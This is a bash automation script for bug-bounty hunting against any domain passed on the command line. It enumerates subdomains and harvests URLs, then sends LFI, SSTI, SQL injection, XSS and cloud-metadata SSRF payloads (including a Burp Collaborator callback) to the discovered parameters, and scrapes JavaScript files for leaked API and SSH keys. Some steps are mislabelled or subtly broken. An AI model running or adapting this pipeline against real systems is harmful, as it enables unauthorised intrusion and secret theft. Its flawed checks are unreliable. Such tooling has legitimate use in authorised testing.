source ~/.bash_profile

RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
BLUE=$(tput setaf 4)
RESET=$(tput sgr0)

echo "${RED} ######################################################### ${RESET}"
echo "${RED} #                         Let's Hunt                    # ${RESET}"
echo "${RED} ######################################################### ${RESET}"

while getopts ":d:" input; do
        case "$input" in
        d)
                domain=${OPTARG}
                ;;
        esac
done
if [ -z "$domain" ]; then
        echo "${BLUE}Please give a domain like \"-d domain.com\"${RESET}"
        exit 1
fi

mkdir $domain
cd $domain

echo "${BLUE} ######################################################### ${RESET}"
echo "${BLUE} #                   Finding Subdomains                  # ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"

echo "#####Starting Project Discovery's subfinder #######\n"
subfinder -d $domain -o op.txt
echo "########Done Project Discovery's subfinder########\n"

echo "#########Starting tomnomnom's assetfinder#########\n"
assetfinder --subs-only $domain | tee -a op.txt
echo "########Done tomnomnom's assetfinder##########\n"

echo "########Starting OWASP's amass passive Scan########\n"
amass enum -passive -d $domain | tee -a op.txt
echo "#########Done OWASP's a passive Scan##########\n"

echo "#########Starting OWASP's a Active Scan########\n"
amass enum -active -d $domain -ip | tee -a amass_ips.txt
echo "#########Done OWASP's a active Scan########\n"
cat amass_ips.txt | awk '{print $1}' | tee -a op.txt
cat op.txt | sort -u | tee -a all.txt

echo "${GREEN} ######################################################### ${RESET}"
echo "${GREEN} # Subdomain Bruteforcing Assetnote's altdns              # ${RESET}"
echo "${GREEN} ######################################################### ${RESET}"

altdns -i all.txt -o data_output -w ~/tools/recon/words.txt -r -s results_output.txt -t 250
mv results_output.txt dns_op.txt
cat dns_op.txt >output.txt
cat output.txt | awk -F ":" '{print $1}' | sort -u | tee -a all.txt

echo "${BLUE} ######################################################### ${RESET}"
echo "${BLUE} #              Checking for alive subdomains            # ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"

cat all.txt | httprobe -c 100 | tee -a alive2.txt
cat alive2.txt | sort -u | tee -a alive.txt
rm alive2.txt

echo "${BLUE} ######################################################### ${RESET}"
echo "${BLUE} #            Domain TakeOver Using Nikto                # ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"

nuclei -l alive.txt -t "/home/kali/nuclei-templates/takeovers/*.yaml" -c 100 -o nuclei_op/takeovers.txt

echo "${BLUE} ######################################################### ${RESET}"
echo "${BLUE} #                   Starting CMS detection              # ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"

whatweb -i alive.txt | tee -a whatweb_op.txt

echo "${BLUE} ######################################################### ${RESET}"
echo "${BLUE} #              Checking for Web Server Vuln Nikto       # ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"

cat alive.txt | awk -F/ '{print $3}'| sort -u | tee -a nikto_scan.txt
mkdir Nikto_Scan
interlace -tL ./nikto_scan.txt -threads 5 -c "nikto --host _target_ > ./Nikto_Scan/_target_-nikto.txt" -p 80,443 -v 

echo "${GREEN} ######################################################### ${RESET}"
echo "${GREEN} #                 Looking_for_ClickJacking              # ${RESET}"
echo "${GREEN} ######################################################### ${RESET}"

mkdir ClickJacking
mkdir ClickJacking/POC/
python3 /home/kali/tools/Clickjacking-Scanner/Clickjacking_Scanner.py nikto_scan.txt | tee -a ClickJacking/ClickJacking1.txt
cat ClickJacking/ClickJacking1.txt | grep 'Website is Vulnerable' -B 2 | sort -u > ClickJacking/ClickJacking_vul.txt;
mv *.html ClickJacking/POC/

echo "${GREEN} ######################################################### ${RESET}"
echo "${GREEN} #           Looking for CORS misconfiguration           # ${RESET}"
echo "${GREEN} ######################################################### ${RESET}"

python3 ~/tools/Corsy/corsy.py -i alive.txt -t 40 | tee -a corsy_op.txt

echo "${BLUE} ######################################################### ${RESET}"
echo "${BLUE} #            Looking for HTTP request smuggling         # ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"

cat alive.txt | python3 /home/kali/tools/smuggler/smuggler.py | tee -a smuggler_op.txt

#interlace -tL ./alive.txt -threads 5 -c "python3 /home/kali/tools/smuggler/smuggler.py -u _target_" | tee -a > smuggler_ops.txt
#for i in $(cat alive.txt); do python3 /home/kali/tools/smuggler/smuggler.py -u $i ; done >> smuggler_op.txt

echo "${GREEN} ######################################################### ${RESET}"
echo "${GREEN} #               WayBack & Gau Url Gathering             # ${RESET}"
echo "${GREEN} ######################################################### ${RESET}"

mkdir wayback_data
#for i in $(cat alive.txt); do echo $i | waybackurls; done | tee -a wayback_data/wb.txt

cat alive.txt | sort -u | ~/go/bin/gau | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg)" | tee gau
cat alive.txt | sort -u | ~/go/bin/waybackurls | egrep -iv ".(jpg|gif|css|png|woff|pdf|svg)" | tee wayback
cat gau wayback | sort -u | tee -a urls

cat alive.txt | ~/go/bin/subjs | tee -a wayback_data/jsurls1.txt
#cat urls | sort -u | unfurl --unique keys | tee -a wayback_data/paramlist.txt
cat urls | grep -P "\w+\.js(\?|$)" | sort -u | tee -a wayback_data/jsurls1.txt
cat urls | grep -P "\w+\.php(\?|$)" | sort -u | tee -a wayback_data/phpurls.txt
cat urls | grep -P "\w+\.aspx(\?|$)" | sort -u | tee -a wayback_data/aspxurls.txt
cat urls | grep -P "\w+\.jsp(\?|$)" | sort -u | tee -a wayback_data/jspurls.txt
cat urls | grep -P "\w+\.txt(\?|$)" | sort -u | tee -a wayback_data/robots.txt

cat wayback_data/jsurls1.txt | sort -u | tee -a wayback_data/jsurls.txt
rm wayback_data/jsurls1.txt

echo "${BLUE} ######################################################### ${RESET}"
echo            "${RED} Performing : ${GREEN} GF Sorting ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"
mkdir gfsort
~/go/bin/gf --list | while read line; do cat urls | ~/go/bin/gf $line | tee gfsort/$line; done


echo "${BLUE} ######################################################### ${RESET}"
echo "${BLUE} #              Secret Finding in JS Files               # ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"

for i in $(cat wayback_data/jsurls.txt); do python3 /home/kali/tools/SecretFinder/SecretFinder.py -i $i -e -o cli ; done >> secretfinder.txt
cat secretfinder.txt | grep 'google_api|amazon_aws_access_key_id|amazon_mws_auth_toke|amazon_aws_url|mailgun_api_key|facebook_access_token|github_access_token|rsa_private_key|ssh_dsa_private_key|ssh_dc_private_key' -B 1 | sort -u > Secrets_main.txt;

echo "${BLUE} ######################################################### ${RESET}"
echo  "${RED} Performing : ${GREEN} Nuclei and Jaeles Testing per GF ${RESET}"
echo "${BLUE} ######################################################### ${RESET}"

echo --------------------------------LFI------------------------------------
cat gfsort/lfi | uro | tee -a gfsort/lfi1
cat gfsort/lfi1 | ~/go/bin/qsreplace "../../../../etc/passwd" | ~/go/bin/httpx -match-regex 'root:x' -threads 300 | tee LFI.txt 

echo --------------------------------SSTI-----------------------------------
cat gfsort/ssti | uro | tee -a gfsort/ssti1
cat gfsort/ssti1 | ~/go/bin/qsreplace "SSTI{{9*9}}"  | ~/go/bin/httpx -match-regex 'SSTI81' -threads 300 | tee SSTI.txt 

echo --------------------------------OPEN REDIRECT--------------------------
cat gfsort/redirect | uro | tee -a gfsort/redirect1
cat gfsort/redirect1 | xargs -I@ ~/go/bin/jaeles scan -c 100 -s ~/jaeles-signatures/fuzz/open-redirect -u @ | tee -a open_vul.txt

echo --------------------------------CVEs--------------------------
cat gfsort/interesting* | uro | tee -a gfsort/interesting1
cat gfsort/interesting1 | sort -u | nuclei -t /home/kali/nuclei-templates/cves/ -o CVEs_Vul.txt 

echo --------------------------------SQLi--------------------------
cat gfsort/sqli | uro | tee -a gfsort/sqli1
cat gfsort/sqli1 | ~/go/bin/qsreplace "' OR '1" | ~/go/bin/httpx -silent -srd output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n" | tee -a SQLi_Vul.txt 

echo --------------------------------SSRF--------------------------
cat gfsort/ssrf | uro | tee -a gfsort/ssrf1
cat gfsort/ssrf1 | sort -u |anew | httpx | qsreplace 'http://169.254.169.254/latest/meta-data/hostname' | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo “SSRF VULN! %”' | tee -a SSRF_Vul.txt

cat gfsort/ssrf1 |qsreplace “esa701qhk2hbnmy6aaymnstrzi58tx.burpcollaborator.net” >> gfsort/ssrf-ffuf.txt
ffuf -c -w gfsort/ssrf-ffuf.txt -u FUZZ

echo '______________________________________________________________________'
echo  "${RED} Performing : ${GREEN} XSS ${RESET}"
echo '----------------------------------------------------------------------'
cat gfsort/xss | uro | tee -a gfsort/xss1
cat gfsort/xss1 | ~/go/bin/kxss | ~/go/bin/dalfox pipe -o XSS.txt &

echo '______________________________________________________________________'
echo  "${RED} Performing : ${GREEN} XSS hunt without GF ${RESET}"
echo '----------------------------------------------------------------------'
cat urls | uro | tee -a urls1
cat urls1 | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done

